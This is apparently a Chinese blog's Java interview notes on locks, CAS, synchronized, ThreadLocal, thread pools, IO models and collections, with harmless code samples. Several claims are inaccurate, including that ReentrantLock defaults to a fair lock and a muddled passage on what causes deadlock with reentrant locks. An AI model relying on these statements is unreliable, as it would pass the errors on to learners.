高并发的场景下，乐观锁相比悲观锁来说，不存在锁竞争造成线程阻塞，也不会有死锁的问题，在性能上往往会更胜一筹。 但是，如果冲突频繁发生（写占比非常多的情况），会频繁失败和重试，这样同样会非常影响性能，导致 CPU 飙升。 两者使用方式 悲观锁通常多用于写比较多的情况（多写场景，竞争激烈），这样可以避免频繁失败和重试影响性能，悲观锁的开销是固定的。 不过，如果乐观锁解决了频繁失败和重试这个问题的话（比如LongAdder），也是可以考虑使用乐观锁的，要视实际情况而定。乐观锁通常多用于写比较少的情况（多读场景，竞争较少），这样可以避免频繁加锁影响性能。不过，乐观锁主要针对的对象是单个共享变量（参考java.util.concurrent.atomic包下面的原子变量类）。 CAS算法流程 是一个原子操作 涉及到 var变量，expected预期值，new预期写入的新值 当v = e时，通过new更新v，如果v != e,就说明其他进程要写，当前线程放弃更新 当多个线程同时使用 CAS 操作一个变量时，只有一个会成功更新，其余均会失败，但失败的线程并不会被挂起，仅是被告知失败，并且允许再次尝试，当然也允许失败的线程放弃操作。 java语言中的cas类是通过unsafe类里的compareAndSwapObject实现的 它是C++内联汇编的产物 乐观锁的ABA问题检查变量的时候，原值为A，要赋值为B时检测为A，但是不能保证这之前没有被其他线程修改过 解决思路：在变量前追加版本号/时间戳：AtomicStampedReference 乐观锁的循环时间长的问题CAS使用自旋锁来进行重试，降低消耗使用pause指令 synchronized关键字 修饰实例方法：锁当前对象实例 修饰静态方法：锁当前类 修饰代码块：对括号里指定的对象/类加锁12345678910111213// 给当前对象实例加锁，进入同步代码前要获得 当前对象实例的锁 。synchronized void method() &#123; //业务代码&#125;// 给当前类加锁，会作用于类的所有对象实例 ，进入同步代码前要获得 当前 class 的锁synchronized static void method() &#123; //业务代码&#125;// synchronized(object) 表示进入同步代码库前要获得 给定对象的锁。// synchronized(类.class) 表示进入同步代码前要获得 给定 Class 的锁synchronized(this) &#123; //业务代码&#125; synchronized(A.class) 和修饰static方法都是要锁的class synchronized+方法是给实例对象加锁 [问题]静态 synchronized 方法和非静态 synchronized 方法之间的调用互斥么？不互斥！锁的是两种不同的方法，静态用的是当前类的锁，非静态锁的是单个实例对象 构造方法能不能使用 synchronized 关键字修饰【不能】 因为构造方法本身属于线程安全，构造一个对象是原子操作多线程可能有些特殊情况造成不安全。 比如说逃逸问题：如果在构造方法中将未完全初始化的对象引用传递给其他线程，其他线程可能会在对象完全初始化之前访问它，这也可能导致线程不安全123456public class EscapingExample &#123; private static SomeObject sharedObject; public EscapingExample() &#123; sharedObject = new SomeObject(); // 逃逸 &#125;&#125; 构造时，可以使用静态工厂方法构造对象 底层原理了解吗，很了解，通过对象监视器和访问标识来实现 synchronized 同步语句块：使用的是 monitorenter 和 monitorexit 指令，其中 monitorenter 指令指向同步代码块的开始位置，monitorexit 指令则指明同步代码块的结束位置。 修饰方法：JVM通过一个访问标识ACC_SYNCHRONIZED 指明这一个同步方法 synchronized 和 volatile关键字，互补 volatile 修饰变量，synchronized修饰方法和代码块 volatile 保证顺序性可见性，synchronized保证可见性和原子性 volatile 解决变量在多个线程之间的可见性，synchronized解决多线程访问资源的同步性 ReentrantLock是一个可重入的独占锁 底层用AbstractQueuedSynchronizer 实现,内部的Sync类继承了AQS类， 实现公平锁和非公平锁 UnFairSync和FairSync，都是继承的内部类Sync实现的，默认使用公平锁 可重入锁 也叫递归锁，指的是线程可以再次获取自己的内部锁。比如一个线程获得了某个对象的锁，此时这个对象锁还没有释放，当其再次想要获取这个对象的锁的时候还是可以获取的，如果是不可重入锁的话，就会造成死锁。 synchronized 和 reentrantlock sychronized 依赖于 jvm的对象监视器monitor、访问标识，reentrantlock依赖于jdk层面 reentrantlock需要配合trycatch，抛出的异常是InterruptedException threadLocal（变量）可以让每个线程绑定自己的值，可以将ThreadLocal类形象的比喻成存放数据的盒子，盒子中可以存储每个线程的私有数据 1234567891011121314151617181920212223242526272829// 常用方法import java.text.SimpleDateFormat;public class ThreadLocalExample implements Runnable&#123; // SimpleDateFormat 不是线程安全的，所以每个线程都要有自己独立的副本withInitial(obj)作为本地线程的一个对象 private static final ThreadLocal&lt;SimpleDateFormat&gt; formatter = ThreadLocal.withInitial(() -&gt; new SimpleDateFormat(\"yyyyMMdd HHmm\")); public static void main(String[] args) throws InterruptedException &#123; ThreadLocalExample obj = new ThreadLocalExample(); for(int i=0 ; i&lt;10; i++)&#123; Thread t = new Thread(obj, \"\"+i); t.start(); &#125; &#125; @Override public void run() &#123; System.out.println(\"Thread Name= \"+Thread.currentThread().getName()+\" default Formatter = \"+formatter.get().toPattern()); try &#123; Thread.sleep(new Random().nextInt(1000)); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; //formatter pattern is changed here by thread, but it won't reflect to other threads formatter.set(new SimpleDateFormat()); System.out.println(\"Thread Name= \"+Thread.currentThread().getName()+\" formatter = \"+formatter.get().toPattern()); &#125;&#125; threadLocal原理 通过维护threadlocalmap类型的两个变量threadLocals,inheritableThreadLocals可继承threadlocals 初始化为null，当当前线程调用set get时，进行创建12345678public class Thread implements Runnable &#123; //与此线程有关的ThreadLocal值。由ThreadLocal类维护 ThreadLocal.ThreadLocalMap threadLocals = null; //与此线程有关的InheritableThreadLocal值。由InheritableThreadLocal类维护 ThreadLocal.ThreadLocalMap inheritableThreadLocals = null;&#125; threadlocal内存泄漏问题 ThreadLocalMap 中使用的 key 为 ThreadLocal 的弱引用，而 value 是强引用。 所以，如果 ThreadLocal 没有被外部强引用的情况下，在垃圾回收的时候，key 会被清理掉，而 value 不会被清理掉，导致了内存泄漏 ThreadLocalMap 中就会出现 key 为 null 的 Entry。假如我们不做任何措施的话，value 永远无法被 GC 回收，这个时候就可能会产生内存泄露。 ThreadLocalMap 实现中已经考虑了这种情况，在调用 set()、get()、remove() 方法的时候，会清理掉 key 为 null 的记录。使用完 ThreadLocal方法后最好手动调用remove()方法 弱引用WeakReference 强引用指可以直接访问对象的引用，一般不会被gc，弱引用的话，弱引用不会阻止被引用对象的垃圾回收，也就是说，当只有弱引用引用一个对象时，垃圾回收器可以随时回收该对象，而不考虑当前内存是否足够。这使得弱引用非常适合用于缓存等场景，当内存资源不足时，缓存中的对象可以被及时释放。 线程池使用ThreadPoolExecutor构造方法去创建 FixedThreadPool：该方法返回一个固定线程数量的线程池。该线程池中的线程数量始终不变。当有一个新的任务提交时，线程池中若有空闲线程，则立即执行。若没有，则新的任务会被暂存在一个任务队列中，待有线程空闲时，便处理在任务队列中的任务。 SingleThreadExecutor： 该方法返回一个只有一个线程的线程池。若多余一个任务被提交到该线程池，任务会被保存在一个任务队列中，待线程空闲，按先入先出的顺序执行队列中的任务。 CachedThreadPool： 该方法返回一个可根据实际情况调整线程数量的线程池。初始大小为 0。当有新任务提交时，如果当前线程池中没有线程可用，它会创建一个新的线程来处理该任务。如果在一段时间内（默认为 60 秒）没有新任务提交，核心线程会超时并被销毁，从而缩小线程池的大小。 ScheduledThreadPool：该方法返回一个用来在给定的延迟后运行任务或者定期执行任务的线程池。 内置线程池Executor是什么，为什么不建议使用【容易导致内存泄漏】使用线程池的好处是减少在创建和销毁线程上所消耗的时间以及系统资源开销，解决资源不足的问题。如果不使用线程池，有可能会造成系统创建大量同类线程而导致消耗完内存或者“过度切换”的问题。 使用executors返回的线程池可能导致的问题如下： FixedThreadPool 和 SingleThreadExecutor：使用的是无界的 LinkedBlockingQueue，任务队列最大长度为 Integer.MAX_VALUE,可能堆积大量的请求，从而导致 OOM CachedThreadPool：使用的是同步队列 SynchronousQueue, 允许创建的线程数量为 Integer.MAX_VALUE ，如果任务数量过多且执行速度较慢，可能会创建大量的线程，从而导致 OOM ScheduledThreadPool 和 SingleThreadScheduledExecutor : 使用的无界的延迟阻塞队列DelayedWorkQueue，任务队列最大长度为 Integer.MAX_VALUE,可能堆积大量的请求，从而导致 OOM 实现一个根据任务的优先级来执行的线程池【使用阻塞队列】通过构造函数，传入一个ProorityBlockingQueue&lt;Runnable&gt;","categories":[{"name":"Java","slug":"Java","permalink":"http://waynamigo.github.io/categories/Java/"}],"tags":[{"name":"面试","slug":"面试","permalink":"http://waynamigo.github.io/tags/面试/"},{"name":"Java","slug":"Java","permalink":"http://waynamigo.github.io/tags/Java/"}]},{"title":"Java random","slug":"2023-01-10-面经Java问题","date":"2023-01-09T16:00:00.000Z","updated":"2023-10-30T17:25:43.475Z","comments":true,"path":"2023/01/10/2023-01-10-面经Java问题/","link":"","permalink":"http://waynamigo.github.io/2023/01/10/2023-01-10-面经Java问题/","excerpt":"ook","text":"ook 基础1. 重载和重写的区别 重载 overload：方法名相同，返回值和形参，访问修饰符可能不同，发生在一个类中；编译时发生 重写 override：发生在继承中，（覆盖），方法名和形参都相同，修饰符大于等于父类，子类不能重写父类的private方法， 2. string stringbuffer stringbuilder string用final修饰，底层用byte[]，java9之前用的char[]，节省字符串占用的内存 stringbuffer对原对象操作，线程安全，用了sychronized修饰？ stringbuilder线程不安全，单线程使用这个3. 接口interface和抽象类abstract class的区别 抽象类只能继承一个，接口可以有多个实现 抽象类中可以有普通成员函数（及实现），包括构造方法，接口只能有public的abstract方法 抽象类中可以有普通成员变量， 接口只能有public static final类型成员abstract class：只能继承一个interface 抽象类用于代码复用，比如抽象工厂，接口用于对类的行为进行约束，关注某些操作时用接口 4. hashcode和equals hashcode是获取对象的hash码，作用是确定在哈希表的位置，java任何类都有hashcode()函数，在Object父类里5. ArrayList和LinkedList ArrayList基于动态数组，连续内存存储，动态用扩容实现，类似于C++的vector和Java、python的slice LinkedList基于链表实现，存储分散的内存，适合插入删除，不适合查询，根据下标get(i)需要遍历6. HashMap和HashTable HashMap并发不安全，HashTable用sychronized修饰，并发安全 数组+链表实现的，7. jdk7.concurrentHashMap原理 数据结构使用ReentrantLock + Segment + HashEntry ，一个Segment包含一个HashEntry数组，每个HashEntry是一个链表 元素查询：使用二次hash，第一次找到segment，第二次定位到元素所在的头部 锁使用了Segment分段锁，Segment继承ReentrantLock，其他Segment不受影响，数组扩容不影响其他Segment8. jdk8.concurrentHashMap原理 数据结构使用sychronized + CAS +红黑树，Node的next和val都用volatile修饰，查找替换赋值使用CAS 元素查询：使用CAS查找【】 锁：锁了head结点，其他元素的读写不受影响，读操作无锁9. IOC容器和AOP是什么 Inversion of Control 控制反转，就是把对象的创建管理的权利反转给外部的环境 Aspect Oriented Programming 面向切片编程，将日志、权限、接口等关注点从核心业务分离出来，通过动态代理等技术。各种注解就是以AOP的思想和机制实现的10. Spring的AOP如何实现的【动态代理】 Spring AOP：如果需要代理的对象实现了某个接口，SpringAOP使用JDKProxy创建代理对象，如果存在没有实现接口的对象，使用cglib生成一个被代理对象的子类作为代理 Aspect J：切面多的情况下使用，性能有优势11.java程序运行的流程 源码 .java 编译器 字节码 .class jvm解释器 机器的二进制码 运行12. equals 和 == 的区别 ==比较基础类型，和引用类型的地址是否相同 equals比较两个对象是否相同 Integer 与int的比较，以右边为基础，使用 Integer == int 发生拆箱；使用int == Integer发生装箱 Integer.equals(int)发生装箱，再比较内容13. final finally finalize的区别 final修饰类（不可继承）、方法（不可重写）、变量（不可修改） finally修饰代码块，常用于释放资源、关闭连接等 finalize用于垃圾回收，已经被废弃14. BIO NIO AIO 阻塞与非阻塞： BIO是阻塞式I/O模型，线程会一直被阻塞等待操作完成。 NIO是非阻塞式I/O模型，线程可以去做其他任务，当I/O操作完成时得到通知。 AIO也是非阻塞式I/O模型，不需要用户线程关注I/O事件，由操作系统通过回调机制处理。 缓冲区： BIO使用传统的字节流和字符流，需要为输入输出流分别创建缓冲区。 NIO引入了基于通道和缓冲区的I/O方式，使用一个缓冲区完成数据读写操作。 AIO则不需要缓冲区，使用异步回调方式进行操作。 线程模型： BIO采用一个线程处理一个请求方式，面对高并发时线程数量急剧增加，容易导致系统崩溃。 NIO采用多路复用器来监听多个客户端请求，使用一个线程处理，减少线程数量，提高系统性能。 AIO依靠操作系统完成I/O操作，不需要额外的线程池或多路复用器。Java 中 3 种常见 IO 模型 BIO (Blocking I/O)BIO 属于同步阻塞 IO 模型 。 同步阻塞 IO 模型中，应用程序发起 read 调用后，会一直阻塞，直到在内核把数据拷贝到用户空间。 在客户端连接数量不高的情况下，是没问题的。但是，当面对十万甚至百万级连接的时候，传统的 BIO 模型是无能为力的。因此，我们需要一种更高效的 I/O 处理模型来应对更高的并发量。 NIO (Non-blocking/New I/O)Java 中的 NIO 于 Java 1.4 中引入，对应 java.nio 包，提供了 Channel , Selector，Buffer 等抽象。NIO 中的 N 可以理解为 Non-blocking，不单纯是 New。它支持面向缓冲的，基于通道的 I/O 操作方法。 对于高负载、高并发的（网络）应用，应使用 NIO 。 Java 中的 NIO 可以看作是 I/O 多路复用模型。也有很多人认为，Java 中的 NIO 属于同步非阻塞 IO 模型。 跟着我的思路往下看看，相信你会得到答案！ 我们先来看看 同步非阻塞 IO 模型。 img 同步非阻塞 IO 模型中，应用程序会一直发起 read 调用，等待数据从内核空间拷贝到用户空间的这段时间里，线程依然是阻塞的，直到在内核把数据拷贝到用户空间。 相比于同步阻塞 IO 模型，同步非阻塞 IO 模型确实有了很大改进。通过轮询操作，避免了一直阻塞。 但是，这种 IO 模型同样存在问题：应用程序不断进行 I/O 系统调用轮询数据是否已经准备好的过程是十分消耗 CPU 资源的。 这个时候，I/O 多路复用模型 就上场了。 img IO 多路复用模型中，线程首先发起 select 调用，询问内核数据是否准备就绪，等内核把数据准备好了，用户线程再发起 read 调用。read 调用的过程（数据从内核空间-&gt;用户空间）还是阻塞的。 目前支持 IO 多路复用的系统调用，有 select，epoll 等等。select 系统调用，是目前几乎在所有的操作系统上都有支持 select 调用 ：内核提供的系统调用，它支持一次查询多个系统调用的可用状态。几乎所有的操作系统都支持。 epoll 调用 ：linux 2.6 内核，属于 select 调用的增强版本，优化了 IO 的执行效率。 IO 多路复用模型，通过减少无效的系统调用，减少了对 CPU 资源的消耗。 Java 中的 NIO ，有一个非常重要的选择器 ( Selector ) 的概念，也可以被称为 多路复用器。通过它，只需要一个线程便可以管理多个客户端连接。当客户端数据到了之后，才会为其服务。 AIO (Asynchronous I/O)AIO 也就是 NIO 2。Java 7 中引入了 NIO 的改进版 NIO 2,它是异步 IO 模型。 异步 IO 是基于事件和回调机制实现的，也就是应用操作之后会直接返回，不会堵塞在那里，当后台处理完成，操作系统会通知相应的线程进行后续的操作。 目前来说 AIO 的应用还不是很广泛。Netty 之前也尝试使用过 AIO，不过又放弃了。这是因为，Netty 使用了 AIO 之后，在 Linux 系统上的性能并没有多少提升。 最后，来一张图，简单总结一下 Java 中的 BIO、NIO、AIO。 15. 反射用途和实现原理反射是通过运行时检查类信息完成的 123Class&lt;?&gt; cls = ClassName.class;Class&lt;?&gt; cls = obj.getClass();Class&lt;?&gt; cls = Class.forName(\"ClassName\"); 原理：反射API实现，Class，Method，Field，Constructor Class.forName和ClassLoader的区别 Class.forName是一个静态方法，通过提供类的完全限定名，在运行时加载类。此方法还会执行类的静态初始化块。如果类名不存在或无法访问，将抛出ClassNotFoundException异常。 ClassLoader是一个抽象类，类加载器，负责将类文件加载到Java虚拟机中。ClassLoader可以动态加载类，从不同来源加载类文件，如本地文件系统、网络等。 16. 可重入锁是什么？解释ReentrantLock和sychronized的区别可重入锁是允许重新获取机制的锁。就像拿钥匙开锁一样，你可以反复用同一把钥匙开锁。这种锁在同一线程内是安全的，因为它可以被同一线程多次获取，而不会产生不一致的状态。举个例子，假设有一个线程A在执行一个方法，同时这个方法内部又调用另一个方法，那么线程A可以重复获取同一个锁，而不会出现死锁的情况。因为同一线程可以多次获取同一个锁，所以这种锁机制避免了死锁的发生。但是需要注意，在使用可重入锁时，必须保证在释放锁之前已经获取了该锁，否则会导致死锁。同时还需要保证在获取锁的时候没有嵌套地获取其他锁，否则也会导致死锁。另外，还必须保证在获取锁的时候没有阻塞其他线程，否则同样会导致死锁。总之，可重入锁是一种安全的锁机制，可以避免死锁的发生。但是在使用时需要注意以上几点，以确保程序的正确性和安全性。 实现上：synchronized 是一个关键字，是在JVM层面通过监视器实现的，而 ReentrantLock 是基于AQS（AbstractQueuedSynchronizer）实现的。 用法上：reentrantlock修饰代码块，synchronized修饰方法，静态方法和代码块 显隐式：Synchronized 是隐式锁，进入synchronized代码块之后自动加锁，离开后自动释放锁；ReentrantLock显示定义，然后手动用lockunlock 中断响应：sync不能直接响应终端，reentrantlock可以响应中断，避免死锁17. java序列化讲一下指将Java对象转换为字节流的过程，可以将这些字节流保存到文件中或通过网络传输。使用implements Serializable接口18. notify()和 notifyall()的区别 notify方法用于唤醒在当前对象上等待的单个线程,具体是哪个线程被唤醒是不确定的，取决于线程调度器的实现 notifyall 用于唤醒在当前对象上等待的所有线程。 如果有多个线程在某个对象上等待，调用notifyAll()方法后，所有等待的线程都会被唤醒并竞争该对象的锁。其中一个线程获得锁后继续执行，其他线程则继续等待。19. 静态内部类和非静态内部类 实例化方式：静态内部类可以直接通过外部类名来实例化，而非静态内部类必须要通过外部类的实例来实例化。 对外部类的引用：静态内部类不持有对外部类实例的引用，而非静态内部类则会持有对外部类实例的引用。这意味着在静态内部类中不能直接访问外部类的非静态成员（方法或字段），而非静态内部类可以。 生命周期：静态内部类的生命周期与外部类相互独立，即使外部类实例被销毁，静态内部类仍然存在。非静态内部类的生命周期与外部类实例绑定，只有在外部类实例存在时才能创建非静态内部类的实例。 访问权限：静态内部类对外部类的访问权限与其他类一样，根据访问修饰符而定。非静态内部类可以访问外部类的所有成员，包括私有成员20. 自定义注解的场景和实现 扩展框架 运行时检查，单元测试，配和写Log等 规范约束实现方式 使用@interface关键字定义注解。 可在注解中定义属性，并指定默认值。 根据需求，可添加元注解来控制注解的使用方式。 在代码中使用自定义注解。 使用反射机制解析注解信息。21. java的构造器能否被重写 override【不可以，只能在子类super父类进行增量更改】 22. java实现对象克隆【深拷贝浅拷贝】 浅拷贝：通过创建一个新对象，并将原对象的非静态字段值复制给新对象实现。新对象和原对象共享引用数据。在Java中，可以使用clone()方法实现浅拷贝。要实现一个类的克隆操作，需要满足以下条件 实现Cloneable接口。 重写Object类的clone()方法，声明为public访问权限。 在clone()方法中调用super.clone()，并处理引用类型字段。 深拷贝：通过创建一个新对象，并将原对象的所有字段值复制给新对象，包括引用类型数据。新对象和原对象拥有独立的引用数据。实现深拷贝有以下方式： 使用序列化和反序列化实现深拷贝，要求对象及其引用类型字段实现Serializable接口。 自定义拷贝方法，递归拷贝引用类型字段。23. java中常见的运行时异常 空指针异常：当应用程序尝试使用 null 对象时抛出。 数组越界异常：当应用程序尝试访问数组元素的时候，数组下标超出了数组的范围。 类转换异常：当应用程序尝试将一个对象强制转换为不是其实例的子类时抛出。 非法参数异）：当应用程序传递了一个无效或不合法的参数时抛出。 非法状态异常：当应用程序调用了一个不合适的方法或处于不正确的状态时抛出24. synchronized的实现原理是什么通过互斥锁来控制线程对共享变量的访问。 synchronized的实现基础是对象内部的锁（也称为监视器锁或管程），每个锁关联着一个对象实例。 当synchronized作用于某个对象时，它就会尝试获取这个对象的锁，如果锁没有被其他线程占用，则当前线程获取到锁，并可以执行同步代码块；如果锁已经被其他线程占用，那么当前线程就会阻塞在同步块之外，直到获取到锁才能进入同步块。 synchronized还支持作用于类上，此时它锁住的是整个类，而不是类的某个实例。在这种情况下，由于只有一个锁存在，所以所有使用该类的线程都需要等待锁的释放。 在JVM内部，每个Java对象都有头信息，其中包含了对象的一些元信息和状态标志。synchronized通过修改头信息的状态标志来实现锁的获取和释放。 synchronized还支持可重入性，即在同一个线程中可以多次获取同一个锁，这样可以避免死锁问题。 Java虚拟机会通过锁升级的方式来提升synchronized的效率，比如偏向锁、轻量级锁和重量级锁等机制，使得在竞争不激烈的情况下，synchronized的性能可以达到与非同步代码相当的水平。25. ThreadLocal和场景和原理 为每个线程创建独立的变量副本，避免竞争状态，代码层面的体验是一定程度上简化了多线程设计 原理是每个线程都有自己的threadlocalmap，ThreadLocal 对象充当键，线程的变量副本作为对应键的值，set get进行资源设置和获取注意避坑【内存泄漏，线程安全性，数据隔离】应用场景【线程池，数据库连接管理，传递上下文信息】如何防止内存泄漏 内存泄漏是由于 ThreadLocalMap 中的 Entry 没有被及时清理导致的 使用完 ThreadLocal 后及时调用 remove() 方法 使用 try-with-resources 或 try-finally 块，在finally释放资源 使用InheritableThreadLocal26. BigDecimal避坑 使用浮点数初始化时，使用valueOf()，而不是使用new Bigdecimal()：valueof()内部先转换string再初始化 使用equals时，精度（scale）不同也返回false；使用compareTo方法，-1小于，0等于，1大于 divide时，指定一个结果精度，避免无限循环抛出arith异常；使用RoundingMode类选四舍五入等27. 阻塞队列BQ，类似于channel 特点1:队列为空，读进程阻塞 特点2:队列为满，写进程阻塞 ArrayBlockingQueue LinkedBlockingQueue PriorityBlockingQueue应用场景 生产消费者模型 线程池任务队列 线程同步问题：goroutine，多个线程可以共享一个阻塞队列28. 守护线程和普通线程的区别29. 启动线程使用start，而不是用run start方法告诉jvm新建了一个线程，并在新线程中执行与run方法相关联的代码块 run方法仅是一个方法调用，没有新线程创建30. java的线程如何通信 共享内存：使用volatile保证共享变量的可见性 消息传递：消息队列/管道/信号量31. 线程调度算法【抢占式算法】线程优先级是如何设定的？32. 死锁与活锁，饥饿是什么 死锁是进程间互斥且一直等待对方释放资源，都无法继续执行的情况 活锁是运行状态下，多个线程不断地改变自己的状态以回应对方，但最终无法取得进展，导致线程不断重试相同的操作，却无法成功 饥饿,一个比较宽泛的概念，指一个或多个线程或进程由于某种原因无法获得所需的资源或执行机会 33. 什么时候进入waiting状态 等待获取锁的时候 等待IO时 使用Object.wait()方法，等待其他线程调用同对象的notify和notifyall方法唤醒 使用Thread.join()，使当前线程等待目标线程的结束，目标线程结束后，当前线程被唤醒 使用LockSupport.park()，使当前线程等待，直到获取LockSupport指定的许可或者线程被中断、调度。为什么wait和notify要在同步块中调用 同步块提供了互斥性 希望同一时刻只有一个线程能执行wait/notify，避免并发修改问题，不在互斥时进行wait/notify会导致错误的上下文，还有导致竞争状态36. 自动拆箱导致的 空指针 问题数据库的查询结果可能是 null，因为自动拆箱，用基本数据类型接收有 NPE 风险. 减少自动拆箱问题 35. 线程安全如何实现【加锁，原子操作，ThreadLocal减少共享资源，线程安全的设计模式】 线程安全的设计模式：使用单例模式中的双重检查锁定实现，其实就是线程安全的singleton12 34. 三个线程如何顺序执行 思路是2等1的锁，3等2的锁，1等3的锁。实现用join和LockSupport的park和unpark方法。 CountDownLatch。设置初始计数为 2，分别在 T1 和 T2 的线程内等待计数器减少到 0，然后释放 T3 线程。12345678910111213141516171819Thread T1 = new Thread(() -&gt; &#123; // 线程 T1 的任务&#125;);Thread T2 = new Thread(() -&gt; &#123; try &#123; T1.join(); // 等待 T1 执行完成 &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; // 线程 T2 的任务&#125;);Thread T3 = new Thread(() -&gt; &#123; try &#123; T2.join(); // 等待 T2 执行完成 &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; // 线程 T3 的任务&#125;); LockSupport 123456789101112131415161718192021222324private static Thread t1;private static Thread t2;private static Thread t3;public static void main(String[] args) &#123; t1 = new Thread(() -&gt; &#123; System.out.println(\"T1 is running.\"); LockSupport.unpark(t2); // 唤醒线程T2 &#125;); t2 = new Thread(() -&gt; &#123; LockSupport.park(); // 阻塞线程T2 System.out.println(\"T2 is running.\"); LockSupport.unpark(t3); // 唤醒线程T3 &#125;); t3 = new Thread(() -&gt; &#123; LockSupport.park(); // 阻塞线程T3 System.out.println(\"T3 is running.\"); &#125;); t1.start(); t2.start(); t3.start();&#125; CountDownLatch 123456789101112131415161718192021222324252627282930CountDownLatch latch1 = new CountDownLatch(1);CountDownLatch latch2 = new CountDownLatch(1);Thread t1 = new Thread(() -&gt; &#123; System.out.println(\"T1 running.\"); latch1.countDown(); // T1 执行完后释放 latch1&#125;);Thread t2 = new Thread(() -&gt; &#123; try &#123; latch1.await(); // 等待 latch1 的释放 System.out.println(\"T2 running.\"); latch2.countDown(); // T2 执行完后释放 latch2 &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125;&#125;);Thread t3 = new Thread(() -&gt; &#123; try &#123; latch2.await(); // 等待 latch2 的释放 System.out.println(\"T3 running.\"); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125;&#125;);t1.start();t2.start();t3.start();","categories":[{"name":"Java","slug":"Java","permalink":"http://waynamigo.github.io/categories/Java/"}],"tags":[{"name":"面试","slug":"面试","permalink":"http://waynamigo.github.io/tags/面试/"},{"name":"Java","slug":"Java","permalink":"http://waynamigo.github.io/tags/Java/"}]},{"title":"Java collection","slug":"2023-01-10-面经Java集合","date":"2023-01-09T16:00:00.000Z","updated":"2023-10-30T17:25:46.682Z","comments":true,"path":"2023/01/10/2023-01-10-面经Java集合/","link":"","permalink":"http://waynamigo.github.io/2023/01/10/2023-01-10-面经Java集合/","excerpt":"ok","text":"ok Collection List ArrayList: Object[] Vector: Object[] LinkedList: 双向链表 Set HashSet(无序，唯一): 底层采用 HashMap 来保存元素- LinkedHashSet: HashSet 的子类，通过 LinkedHashMap 来实现的 TreeSet(有序，唯一): 红黑树(自平衡的排序二叉树) Queue PriorityQueue: Object[] 数组实现二叉堆 ArrayQueue: Object[] 数组+双指针Map HashMap 开始是链表，链表长度大于阈值8，进行扩容，当容量大于64时，变成红黑树 LinkedHashMap 在HashMap的基础上，增加了一条双向链表，保持KV的插入顺序 Hashtable 数组+链表组成的，数组是 Hashtable 的主体，链表则是主要为了解决哈希冲突而存在的 TreeMap：红黑树TIPs 保证线程安全的手段？Concurrent修饰的Map等 持续更新 List实现ArrayList 和 Array 的区别 一个动态数组和静态数组 区别类似于go语言和python的slice实现 声明时不需要指定大小，动态扩容 支持泛型 支持插入、更改、删除【面试题】说说ArrayList的扩容机制 ArrayList 和 Vector 的区别 ArrayList线程不安全 Vector使用了synchronized关键字保证线程安全Vector 和 Stack 的区别Vector 和 Stack 已经被淘汰，推荐使用并发集合类 ConcurrentHashMap、CopyOnWriteArrayList等， 或者手动实现线程安全的方法来提供安全的多线程操作支持。 ArrayList 可以添加 null 值吗？ArrayList 中可以存储任何类型的对象，包括 null 值。不过，不建议向ArrayList 中添加 null 值， null 值无意义，会让代码难以维护比如忘记做判空处理就会导致空指针异常。 Set实现Comparable 和 Comparator 的区别：都是用于排序 Comparable 接口实际上是出自 java.lang 包 它有一个 compareTo(Object obj)方法用来排序 Comparator 接口实际上是出自 java.util 包 它有一个 compare(Object obj1, Object obj2)方法用来排序 需要对一个集合使用自定义排序时，我们就要重写compareTo()方法或compare()方法 Queue实现Queue 与 Deque 的区别 Queue是单端队列，遵循先进先出（FIFO）规则 Deque 是双端队列，在队列的两端均可以插入或删除元素 PriorityQueue实现：默认最小二叉堆 P利用了二叉堆的数据结构来实现的，底层使用可变长的数组来存储数据 PriorityQueue 通过堆元素的上浮和下沉，实现了在 O(logn) 的时间复杂度内插入元素和删除堆顶元素。 PriorityQueue 是非线程安全的，且不支持存储 NULL 和 non-comparable 的对象。 PriorityQueue 默认是小顶堆，但可以接收一个 Comparator 作为构造参数，从而来自定义元素优先级的先后。 PriorityQueue 在面试中可能更多的会出现在手撕算法的时候，典型例题包括堆排序、求第 K 大的数、带权图的遍历等，所以需要会熟练使用才行。 手撕一个priorityqueue 12 BlockingQueue 支持当队列没有元素时一直阻塞，用于生产者消费者模型 生产者线程会向队列中添加数据，而消费者线程会从队列中取出数据进行处理 ArrayBlockingQueue 和 LinkedBlockingQueue 是 Java 并发包中常用的两种阻塞队列实现 都线程安全，Array底层用的固定数组，Linked底层用的链表，也是扩容机制 ArrayBlockingQueue 生产和消费用的是同一个锁 LinkedBlockingQueue 生产用putLock，消费用的takelock，防止生产者和消费者线程之间的锁争夺 Map实现HashMap 和 Hashtable(淘汰) 的区别 HashMap 是线程不安全的，线程安全版ConcurrentHashMap Hashtable 是线程安全的 HashMap 可以存储 null 的 kv，但 null 作为键只能有一个，null 作为值可以多个 Hashtable 不允许有 null 键和 null 值，否则会抛NullPointerExceptionHashMap的构造函数以及扩容函数 123456789101112131415161718192021222324public HashMap(int initialCapacity, float loadFactor) &#123; if (initialCapacity &lt; 0) throw new IllegalArgumentException(\"Illegal initial capacity: \" + initialCapacity); if (initialCapacity &gt; MAXIMUM_CAPACITY) initialCapacity = MAXIMUM_CAPACITY; if (loadFactor &lt;= 0 || Float.isNaN(loadFactor)) throw new IllegalArgumentException(\"Illegal load factor: \" + loadFactor); this.loadFactor = loadFactor; this.threshold = tableSizeFor(initialCapacity);&#125; public HashMap(int initialCapacity) &#123; this(initialCapacity, DEFAULT_LOAD_FACTOR);&#125;static final int tableSizeFor(int cap) &#123; int n = cap - 1; n |= n &gt;&gt;&gt; 1; n |= n &gt;&gt;&gt; 2; n |= n &gt;&gt;&gt; 4; n |= n &gt;&gt;&gt; 8; n |= n &gt;&gt;&gt; 16; return (n &lt; 0) ? 1 : (n &gt;= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : n + 1;&#125; HashSet HashSet如何检查重复的： 底层使用HashMap123public boolean add(E e) &#123; return map.put(e, PRESENT)==null;&#125; HashMap的底层实现 hash()函数,拉链法解决冲突1234567static final int hash(Object key) &#123; int h; // key.hashCode()：返回散列值也就是hashcode // ^：按位异或 // &gt;&gt;&gt;:无符号右移，忽略符号位，空位都以0补齐 return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);&#125; HashMap线程不安全 jdk1.7前，HashMap 扩容时会造成死循环和数据丢失的问题 jdk1.8后，多个kv可能会被分配到同一个桶（bucket），并以链表或红黑树的形式存储。多个线程对 HashMap 的 put 